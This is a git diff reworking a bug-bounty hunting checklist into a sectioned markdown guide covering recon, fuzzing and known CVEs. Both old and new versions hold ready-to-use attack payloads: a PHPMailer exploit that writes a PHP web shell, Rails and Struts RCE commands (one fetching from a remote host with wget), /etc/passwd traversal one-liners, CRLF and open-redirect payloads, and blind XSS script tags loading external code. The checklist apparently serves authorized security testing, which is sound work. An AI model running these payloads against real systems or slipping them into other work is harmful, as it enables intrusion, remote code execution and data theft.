@@ -1,52 +1,147 @@
-# Smart Hunting ;)
-## Bugs
-- [ ] Add header in the proxy > Options (`X-Forwarded-Host: target.com`) - browse the program and then later click burp > search and try to find your `X-Forwarded-Host` value for web cache deception
-- [ ] Check HTTP Request Smuggling
-- [ ] Apply on `.xhtml`
-- [ ] `Python struts-pwn.py -u http://target.com/orders.xhtml -c "wget http://ip:1337/test" --exploit`
-- [ ] Test for Electronic Code Book (AAAAAAA aaaaaa BBBBB)
-- [ ] `CVE-2016-10033`: PHPMailer RCE
-email: "attacker@127.0.0.1\" -oQ/tmp/ -X/var/www/shell.php root"@127.0.0.1
-subject: <?php system($_GET['c']);?>
-- [ ] Change all request methods to `TRACE` method to disclose or access info
-- [ ] `blc http://target.com -ro` (check for broken links)
-- [ ] Check/Fuzzing `targetname.atlassian.net`
-- [ ] Check/Fuzzing `jira.target.com`
-- [ ] Vhost Fuzzing
-- [ ] Recon/Test for bukets
-- [ ] Check Github & dork list
-(api,token,username,password,secret,dev,prod,jenkins,config,ssh,ftp,MYSQL_PASSWORD,admin,AWS,buket,GITHUB_TOKEN)
-- [ ] `gau --threads 40 target.com`
-- [ ] `waybackurls target.com`
-- [ ] Accessing misconfigured data of an org: `https://storage.googleapis.com/<org-name>`
-- [ ] Unauthorized access to org's google groups: `https://groups.google.com/a/<domain-name>`
-- [ ] `CVE-2013-0156`: Rails Object Injection: ruby rails_rce.rb http://target.com 'cp /etc/passwd public/me.txt'
-(https://gist.githubusercontent.com/postmodern/4499206/raw/a68d6ff8c1f9570a09365036aeb96f6a9fff7121/rails_rce.rb)
-- [ ] `CVE-2019-11043`: Hint: PHP based website on NGINX phuip-fpizdam http://target.com/anyphpfile.php
-- [ ] Check for CRLF Injection
-- [ ] Bypass Open-Redirection protection
-- [ ] Keyfinder
-- [ ] Check email verification `admin@target.com`
-- [ ] `target.com/home/....4....json` (Will disclose all the content of the home dir + sensitive info)
-- [ ] `CVE-2019-19781`: Citrix NetScaler Directory Traversal: `curl -vk -path-as-is https://$TARGET/vpn/../vpns/ 2>&1 | grep "You don't have permission to access /vpns/" >/dev/null && echo "VULNERABLE: $TARGET" || echo "MITIGATED: $TARGET"`
-- [ ] We can look for vulnerabilities such as SQLi, Path Traversal: `cat urls.txt | grep "?" | qsreplace ../../../../etc/passwd | ffuf -u 'FUZZ' -w - -mr '^root:'`
-- [ ] When you test a **Django**, **Rails**, or **NodeJs** web app try the following payloads in the `Accept:` header. (e.g.,`Accept: ../../../../etc/passwd`)
-- [ ] Hunt XSS, SQLi, LFI, and SSRF on any site? Here’s a killer one-liner: `gau target.com | gf xss,lfi,sqli,ssrf | qsreplace FUZZ | ffuf -u FUZZ -w payloads/xss.txt,payloads/lfi.txt,payloads/sqli.txt,payloads/ssrf.txt -fr "FUZZ" | tee param_vulns.txt`
+# 🎯 Smart Hunting Checklist 😉
 
-**Tip:** Add `-t 50` to ffuf for speed, or `-fc 404` to skip dead ends. Test responsibly!
+A comprehensive checklist for smart and advanced bug hunting. Includes recon, vulnerability testing, CVEs, fuzzing, logic flaws, and blind XSS.
 
-- [ ] Discovering a business logic flow bug:
-      
-      Exploiting steps
-      
-        1. Register a new account and take note of the username you used
-        2. Verify and activate the account
-        3. Delete the account
-        4. Now, try registering again using the same username (observe what happens)
-      
-  **Tip:** If the server still `blocks` or `reserved` the **username** after the account is deleted, congratulations! you've just uncovered a business logic flow bug ;)
+---
 
-### Blind XSS
-- [ ] Blind XSS Payload in `User-Agent` header
-- [ ] BXSS payload while logging (Enter the BXSS payload in reset/forget password, login, signup to generate errors)
-- [ ] Use BXSS payload as your password
+## 🛰️ Reconnaissance
+
+- [ ] `gau --threads 40 target.com`  
+  📌 *Example:* Extract archived URLs for deeper testing  
+- [ ] `waybackurls target.com`  
+  📌 *Example:* Retrieve old endpoints from the Wayback Machine  
+- [ ] Check GitHub using dorks  
+  📌 *Example:* Search with dork: `password filename:.env`  
+- [ ] Test for misconfigured storage buckets  
+  📌 *Example:* Access `https://storage.googleapis.com/<org-name>`  
+- [ ] Unauthorized access to Google Groups  
+  📌 *Example:* `https://groups.google.com/a/target.com`  
+- [ ] `blc http://target.com -ro`  
+  📌 *Example:* Check for broken links on the target site  
+- [ ] Email verification abuse  
+  📌 *Example:* Try registering `admin@target.com`
+
+---
+
+## 🔍 Fuzzing & Enumeration
+
+- [ ] VHost fuzzing  
+  📌 *Example:* Test subdomains like `admin.target.com`, `dev.target.com`  
+- [ ] Fuzz Atlassian endpoints  
+  📌 *Example:* `targetname.atlassian.net`  
+- [ ] Fuzz Jira installations  
+  📌 *Example:* `jira.target.com`  
+- [ ] Fuzz `.xhtml` files  
+  📌 *Example:* `/orders.xhtml`  
+- [ ] Sensitive file access via weird paths  
+  📌 *Example:* `target.com/home/....4....json`  
+- [ ] Key/Token discovery  
+  📌 *Example:* Look for API keys in JavaScript or GitHub
+
+---
+
+## 🧪 Vulnerability Testing
+
+### 🧊 Web Cache Deception
+
+- [ ] Add `X-Forwarded-Host: target.com` in Burp > Options  
+  📌 *Example:* Search for this header in logs or cached responses
+
+### 🔄 HTTP Methods
+
+- [ ] Change request method to `TRACE`  
+  📌 *Example:* `TRACE / HTTP/1.1` might leak headers
+
+### 🔁 HTTP Request Smuggling
+
+- [ ] Test for Request Smuggling  
+  📌 *Example:* Try TE/CL desync techniques
+
+### 🔐 CRLF Injection
+
+- [ ] Test for CRLF Injection  
+  📌 *Example:* `%0d%0aSet-Cookie: hacked=1`
+
+### 🔀 Open Redirect Bypass
+
+- [ ] Bypass filters  
+  📌 *Example:* `//evil.com%2F@target.com`
+
+### 🧠 Business Logic Bugs
+
+- [ ] Test account deletion logic  
+  📌 *Example:* Register > Delete > Register again with same username
+
+---
+
+## 💥 Known Exploits & CVEs
+
+- [ ] `CVE-2016-10033` — PHPMailer RCE
+  📌 *Example:*
+```bash
+email: "attacker@127.0.0.1" -oQ/tmp/ -X/var/www/shell.php root"@127.0.0.1
+subject: <?php system($_GET['cmd']); ?>
+```
+- [ ] `CVE-2013-0156` — Ruby on Rails Object Injection
+📌 *Example:*  
+```bash
+ruby rails_rce.rb http://target.com 'cp /etc/passwd public/me.txt'
+```
+- [ ] `CVE-2019-11043` — PHP-FPM RCE on NGINX
+📌 *Example:* 
+```bash
+./phuip-fpizdam http://target.com/info.php
+```
+- [ ] `CVE-2019-19781` — Citrix Directory Traversal
+📌 *Example:*
+```bash
+curl -vk -path-as-is https://$TARGET/vpn/../vpns/
+```
+- [ ] Apache Struts RCE
+📌 *Example:*
+```bash
+python struts-pwn.py -u http://target.com/orders.xhtml -c "wget http://ip:1337/test"
+```
+---
+## 🐛 Common OWASP Vulns
+- [ ] Use `gf + ffuf` to find XSS, LFI, SQLi, SSRF
+📌 *Example:*
+```bash
+gau target.com | gf xss,lfi,sqli,ssrf | qsreplace FUZZ | ffuf -u FUZZ -w payloads/xss.txt -fr "FUZZ"
+```
+- [ ] Try file traversal payloads in `Accept:` header (Django/Rails/Node)
+📌 *Example:*
+```bash
+Accept: ../../../../etc/passwd
+```
+- [ ] Test for SQLi and Path Traversal
+📌 *Example:*
+```bash
+cat urls.txt | grep "?" | qsreplace ../../../../etc/passwd | ffuf -u FUZZ -w - -mr '^root:'
+```
+---
+## 🧬 Crypto / Encoding Issues
+- [ ] Electronic Code Book (ECB) pattern
+📌 *Example:*
+```text
+Look for repeating blocks like AAAAAAA aaaaaa BBBBB
+```
+---
+## 🕵️‍♂️ Blind XSS (BXSS)
+- [ ] Inject BXSS payload in User-Agent header
+📌 *Example:*
+```bash
+<script src=//xss.ht></script>
+```
+- [ ] Use payloads in error-generating forms (login, signup, forgot password)
+- [ ] Set BXSS payload as password
+📌 *Example:*
+```bash
+<script src=//xss.ht></script>
+```
+---
+## 💡 Pro Tips
+- [ ] Use `-t 50` in ffuf for speed
+- [ ] Use `-fc 404` to skip 404 responses
+- [ ] Always test responsibly - follow the program's scope and rules!
+
